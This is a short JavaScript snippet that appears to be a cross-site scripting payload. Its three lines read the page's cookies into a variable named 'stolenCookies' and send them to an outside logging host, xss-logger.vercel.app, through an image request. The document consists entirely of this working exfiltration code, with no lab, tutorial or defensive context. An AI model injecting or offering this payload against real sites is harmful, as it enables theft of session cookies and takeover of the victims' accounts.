var stolenCookies = document.cookie;
var img = new Image();
img.src = "https://xss-logger.vercel.app/logger?cookies=" + encodeURIComponent(stolenCookies);